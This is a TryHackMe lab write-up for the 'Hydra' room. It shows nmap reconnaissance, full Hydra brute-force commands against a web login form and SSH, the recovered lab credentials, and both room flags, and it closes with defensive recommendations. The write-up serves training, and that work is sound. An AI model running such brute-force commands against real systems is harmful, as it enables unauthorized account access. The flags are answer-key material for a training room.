# Hydra - TryHackMe

**Difficulty:** Easy
**OS:** Linux
**Date:** March 29, 2026
**Time:** ~1h30
**Room link:** https://tryhackme.com/room/hydra

---

## 🎯 Objective

Learn how to use Hydra to brute force credentials on different services (Web form & SSH).

---

## 🔍 Reconnaissance

### Nmap Scan

```bash
nmap -p- 10.128.129.124
```

**Results:**
- Port 22: SSH
- Port 80: HTTP

![Nmap Scan](screenshots/nmap.png)

### Web Enumeration

Navigating to `http://10.128.129.124/login`

![Login page](screenshots/login-page.png)

Testing basic credentials → failed.
No apparent SQL injection vulnerability.

**Conclusion:** Brute force required.

---

## 💥 Task 1 - Web Password Brute Force

### Locating rockyou.txt

```bash
find / -name "rockyou.txt" 2>/dev/null
```

**Result:** `/usr/share/wordlists/rockyou.txt`

![Finding rockyou](screenshots/find-rockyou.png)

### HTTP Request Analysis

Inspecting the login form → POST method

**Parameters:**
- username=^USER^
- password=^PASS^
- Error message: "Your username or password is incorrect"

![Burp Suite](screenshots/burp-suite.png)

### Brute Force with Hydra

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.128.129.124 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V
```

![Hydra Web](screenshots/hydra-web.png)

**Credentials found:** `molly:sunshine`

### Retrieving Flag 1

Login with the credentials → Flag 1 displayed

![Flag 1](screenshots/flag1.png)

**Flag 1:** `THM{2673a7dd116de68e85c48ec0b1f2612e}`

---

## 🚀 Task 2 - SSH Password Brute Force

### SSH Brute Force with Hydra

```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.128.129.124 -t 4 ssh
```

![Hydra SSH](screenshots/hydra-ssh.png)

**Credentials found:** `molly:butterfly`

### SSH Connection

```bash
ssh molly@10.128.129.124
```

![SSH Connection](screenshots/ssh-connection.png)

### Retrieving Flag 2

```bash
whoami
pwd
ls
cat flag2.txt
```

![Flag 2](screenshots/flag2.png)

**Flag 2:** `THM{c8eeb0468febbadea859baeb33b2541b}`

---

## 📚 What I Learned

1. **Hydra is a powerful tool** for credential brute forcing across different protocols (HTTP, SSH, FTP, etc.)

2. **Syntax matters**: The `http-post-form` command requires a precise structure with `^USER^` and `^PASS^` parameters

3. **The `-t` flag** controls the number of parallel threads (important to avoid overwhelming the target server)

4. **Effective wordlists**: rockyou.txt contains 14M+ passwords and remains a reference for brute forcing

---

## 🛠️ Tools Used

- Nmap (reconnaissance)
- Hydra (brute force)
- Burp Suite (HTTP analysis)
- SSH (connection)

---

## 💡 Security Recommendations

To protect against this type of attack:

1. **Rate limiting**: Limit the number of login attempts
2. **Account lockout**: Temporarily block after X failed attempts
3. **Strong passwords**: Avoid dictionary words
4. **2FA/MFA**: Add an extra authentication layer
5. **Monitoring**: Alert on brute force attempts

---

*Writeup by 0xMalt - TryHackMe Profile: https://tryhackme.com/p/0xMalt*
